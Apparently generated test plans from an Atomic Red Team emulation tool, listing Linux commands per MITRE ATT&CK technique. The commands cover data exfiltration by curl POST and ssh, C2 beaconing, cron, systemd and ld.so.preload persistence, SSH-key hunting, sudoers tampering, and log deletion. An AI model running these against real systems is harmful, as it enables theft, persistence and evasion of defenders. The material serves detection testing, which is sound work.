T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1501 ,T1064 ,T1139 ,T1057 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1168 ,T1064 ,T1040 ,T1217 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1215 ,T1154 ,T1040 ,T1082 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1064 ,T1145 ,T1057 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1136 ,T1153 ,T1040 ,T1201 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1168 ,T1064 ,T1040 ,T1135 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1154 ,T1040 ,T1018 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1158 ,T1153 ,T1145 ,T1018 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1168 ,T1064 ,T1040 ,T1201 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1154 ,T1040 ,T1018 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1064 ,T1040 ,T1201 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1215 ,T1154 ,T1139 ,T1033 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1136 ,T1153 ,T1040 ,T1083 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
